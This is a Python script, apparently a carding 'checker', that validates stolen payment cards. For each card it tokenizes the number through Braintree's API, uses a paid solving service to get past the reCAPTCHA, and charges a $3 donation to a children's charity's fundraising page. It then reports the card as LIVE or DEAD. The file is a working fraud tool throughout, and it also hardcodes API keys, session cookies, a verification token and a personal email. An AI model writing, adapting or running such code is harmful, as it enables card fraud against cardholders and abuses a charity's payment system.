import requests
import json
import re
import time

class BraintreeTool:
    def __init__(self):
        # URL API
        self.api_url = "https://payments.braintree-api.com/graphql"
        self.captcha_url = "https://autocaptcha.pro/apiv3/process"
        self.payment_url = "https://fundraising.childhood.org.au/payments/donate/embedded"
        self.status_url = "https://fundraising.childhood.org.au/payments/donate/retrieve-payment-status"

    def _(self, cc: str, mes: str, ano: str, cvv: str):
        # Kiểm tra định dạng số thẻ
        if cc[0] == '3' and len(cc) != 15 or len(cc) != 16 or int(cc[0]) not in [3, 4, 5, 6]:
            return False
        # Kiểm tra tháng
        if len(mes) not in [2, 4] or (len(mes) == 2 and (mes > '12' or mes < '01')):
            return False
        # Kiểm tra năm
        if len(ano) not in [2, 4] or (len(ano) == 2 and (ano < '21' or ano > '29')) or (len(ano) == 4 and (ano < '2021' or ano > '2029')):
            return False
        # Kiểm tra CVV
        if cc[0] == '3' and len(cvv) != 4 or len(cvv) != 3:
            return False
        return True

    def getcards(self, text: str):
        text = text.replace('\n', ' ').replace('\r', '')
        card = re.findall(r"[0-9]+\d", text)
        
        if len(card) == 0 or len(card) < 3:
            return None  

        if len(card) == 3:
            cc = card[0]
            if len(card[1]) == 3:
                mes = card[2][:2]
                ano = card[2][2:]
                cvv = card[1]
            else:
                mes = card[1][:2]
                ano = card[1][2:]
                cvv = card[2]
        else:
            cc = card[0]
            if len(card[1]) == 3:
                mes = card[2]
                ano = card[3]
                cvv = card[1]
            else:
                mes = card[1]
                ano = card[2]
                cvv = card[3]
                if len(mes) == 2 and (mes > '12' or mes < '01'):
                    ano1 = mes
                    mes = ano
                    ano = ano1

        result = self._(cc, mes, ano, cvv)
        if result:
            return cc, mes, ano, cvv  

        return None  

    def tokenize_credit_card(self, cc, mes, ano, cvv):
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "NA"
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                    tokenizeCreditCard(input: $input) {     
                        token     
                        creditCard {       
                            bin       
                            brandCode       
                            last4       
                            cardholderName       
                            expirationMonth      
                            expirationYear      
                            binData {         
                                prepaid         
                                healthcare         
                                debit         
                                durbinRegulated         
                                commercial         
                                payroll         
                                issuingBank         
                                countryOfIssuance         
                                productId       
                            }     
                        }   
                    } 
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "Bearer production_mb3d6dk2_yp2cn3cq7mt3jzpw",
            "Braintree-Version": "2018-05-10",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "payments.braintree-api.com",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }

        response = requests.post(self.api_url, headers=headers, data=json.dumps(payload))
        if response.status_code == 200:
            data = response.json()
            return data['data']['tokenizeCreditCard']['token']
        else:
            print(f"Error tokenizing credit card: {response.status_code} - {response.text}")
            return None

    def get_captcha(self):
        captcha_payload = {
            "key": "f85a2bb5c748b3f78eaea839d89b1f64",
            "type": "recaptchav2",
            "googlesitekey": "6LcavOAjAAAAAJ3ApKU6NcsLJJm26rP4DJiI0UTJ",
            "pageurl": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268"
        }

        start_time = time.time()  
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }

        response = requests.post(self.captcha_url, headers=headers, data=json.dumps(captcha_payload))

        if time.time() - start_time > 10:
            print("Captcha retrieval timed out after 10 seconds.")
            return None

        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                print("Captcha retrieved successfully.")  
                return data.get('captcha')  
            else:
                print(f"Captcha retrieval failed: {data.get('message')}")
                return None
        else:
            print(f"Failed to retrieve captcha: {response.status_code} - {response.text}")
            return None

    def process_payment(self, token, captcha):
        payment_payload = {
            "DonationType": "D",
            "Message": None,
            "RegularGivingSettings": {
                "Enable": False,
                "Frequency": "M",
                "NextPayment": "2024-10-29 15:50:15 +00:00",
                "Amount": 3
            },
            "DonationItems": [{
                "AcceptCost": False,
                "IsAnonymous": False,
                "TaxTypeId": 1,
                "ProductType": 1,
                "Description": "Tax Deductible Donation",
                "UnitPrice": 3,
                "Quantity": 1,
                "BeneficiaryId": 1268,
                "EventCampaignId": 10310,
                "FundraisingPageId": None,
                "MainLineItem": True
            }],
            "TokenDetailsForTransaction": {
                "Token": token,
                "Type": "CC",
                "CredentialHolder": "Thanh Vu"
            },
            "CustomerDetails": {
                "DonorType": "I",
                "CompanyName": "",
                "FirstName": "Thanh",
                "LastName": "Vu",
                "EmailAddress": "jpbeluga3@gmail.com",
                "MobileNumber": "",
                "ContactNumber": "",
                "AddressLine1": "",
                "Suburb": "",
                "Postcode": "",
                "State": "",
                "Country": "",
                "ReceiveNewsletter": False,
                "ReceiveGFNewsletter": False
            },
            "TuringTest": captcha,
            "TuringTestResult": {},
            "WaitForCompletion": False,
            "MetaData": []
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "ceH0CkTb8gWQ6JVU3uq0jdoJnJzPF9ReeGawyEBJ58iDyTHoTkMePKNdMT6ziA36kZ23ZBGsPyqm3npX_n0eYZe3nqs1:fWydDKhIC_5tk8_3p_JlMUsXvcOKhyubMZPC5k3RHRZPn76LAlmpVfPuER7laPcgVQb9e8FJb7-jcO4p5gkuiqje0Os1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236; _ga_KEF89HY38C=GS1.1.1722444236.1.0.1722444236.60.0.0; _gaGFR=GA1.3.511065683.1722444237; _gaGFR_gid=GA1.3.2049850676.1722444237; _ga_PMZJSD8XVM=GS1.1.1722444237.1.0.1722444237.0.0.0; _ga_MDKYNCBQ67=GS1.1.1722444237.1.0.1722444237.0.0.0; _ga_S5LBMKZDC2=GS1.1.1722444237.1.0.1722444237.0.0.0; insightech_vid=19109ad49eb.2b4d2; _fbp=fb.2.1722444237676.518488522571686715; gf_cookie_consent={\"c001\":1,\"lastUpdated\":\"2024-07-31T23:43:57+07:00\"}; AWSALB=zXAgc63Doe56bCB2a4J4BVCA01U+CutO2eIyZNf/8hGZpOhKCDeKiJuphYeEwfj66hNOIttEZSo9k8LB9Bdb6LxLlVpDBcpOinaRD09oQeJy4NhwXT+APGedCrRE; AWSALBCORS=zXAgc63Doe56bCB2a4J4BVCA01U+CutO2eIyZNf/8hGZpOhKCDeKiJuphYeEwfj66hNOIttEZSo9k8LB9Bdb6LxLlVpDBcpOinaRD09oQeJy4NhwXT+APGedCrRE; _ga=GA1.3.511065683.1722444237; _gid=GA1.3.1818426974.1722444366; _gat_UA-68997878-2=1"
        }

        response = requests.post(self.payment_url, headers=headers, data=json.dumps(payment_payload))
        if response.status_code in (200, 201):  # Check for both 200 and 201 response codes
            data = response.json()
            ref_id = data['data']['ReferenceId']
            return ref_id  
        else:
            print(f"Failed to process payment. Status Code: {response.status_code} - {response.text}")
            return None

    def check_payment_status(self, ref_id):
        status_payload = {
            "clientReferenceId": ref_id
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "undefined",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537/36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236; _ga_KEF89HY38C=GS1.1.1722444236.1.0.1722444236.60.0.0; _gaGFR=GA1.3.511065683.1722444237; _gaGFR_gid=GA1.3.2049850676.1722444237; _ga_PMZJSD8XVM=GS1.1.1722444237.1.0.1722444237.0.0.0; _ga_MDKYNCBQ67=GS1.1.1722444237.1.0.1722444237.0.0.0; _ga_S5LBMKZDC2=GS1.1.1722444237.1.0.1722444237.0.0.0; insightech_vid=19109ad49eb.2b4d2; _fbp=fb.2.1722444237676.518488522571686715; gf_cookie_consent={\"c001\":1,\"lastUpdated\":\"2024-07-31T23:43:57+07:00\"}; AWSALB=zXAgc63Doe56bCB2a4J4BVCA01U+CutO2eIyZNf/8hGZpOhKCDeKiJuphYeEwfj66hNOIttEZSo9k8LB9Bdb6LxLlVpDBcpOinaRD09oQeJy4NhwXT+APGedCrRE; AWSALBCORS=zXAgc63Doe56bCB2a4J4BVCA01U+CutO2eIyZNf/8hGZpOhKCDeKiJuphYeEwfj66hNOIttEZSo9k8LB9Bdb6LxLlVpDBcpOinaRD09oQeJy4NhwXT+APGedCrRE; _ga=GA1.3.511065683.1722444237; _gid=GA1.3.1818426974.1722444366; _gat_UA-68997878-2=1; _ga_P1YQ8GVGPR=GS1.3.1722444366.1.0.1722444366.0.0.0"
        }

        response = requests.post(self.status_url, headers=headers, data=json.dumps(status_payload))
        if response.status_code == 200:
            data = response.json()
            status = data['data'].get('PaymentStatus', "Failure")
            failure_message = data['data'].get('FailureMessage', "No specific message")
            return status, failure_message  
        else:
            print(f"Failed to retrieve payment status: {response.status_code} - {response.text}")
            return "Failure", None

    def process_cards(self, card_list):
        for card in card_list:
            card_info = self.getcards(card)
            if card_info is None:
                print(f"No valid card found in input: {card}")
                continue

            cc, mes, ano, cvv = card_info

            token = self.tokenize_credit_card(cc, mes, ano, cvv)
            if not token:
                print(f"Failed to tokenize card {cc[-4:]}. Card is DEAD.")
                continue
            
            print(f"Tokenized card {cc[-4:]}: Token {token}")

            captcha = self.get_captcha()
            if not captcha:
                print("Captcha retrieval failed, aborting process.")
                return
            
            ref_id = self.process_payment(token, captcha)
            if ref_id:
                print("Waiting for payment status (7 seconds)...")
                time.sleep(7)  # Đợi 7 giây trước khi kiểm tra trạng thái thanh toán
                status, failure_message = self.check_payment_status(ref_id)
                if status == "SUCCESS":
                    print(f"Payment for card {cc[-4:]} was successful! Card is LIVE.")
                else:
                    print(f"Payment for card {cc[-4:]} failed: {failure_message}. Card is DEAD.")
            else:
                print(f"Failed to process payment for card {cc[-4:]}. Card is DEAD.")

def main():
    while True:
        card_input = input("Enter card details (format <cc>|<mes>|<ano>|<cvv>, multiple cards separated by commas): ")
        card_list = card_input.split(',')
        
        tool = BraintreeTool()
        tool.process_cards(card_list)
        
        cont = input("Do you want to process more cards? (Y/N): ").lower()
        if cont != 'y':
            print("Exiting the tool. Goodbye!")
            break

if __name__ == "__main__":
    main() 
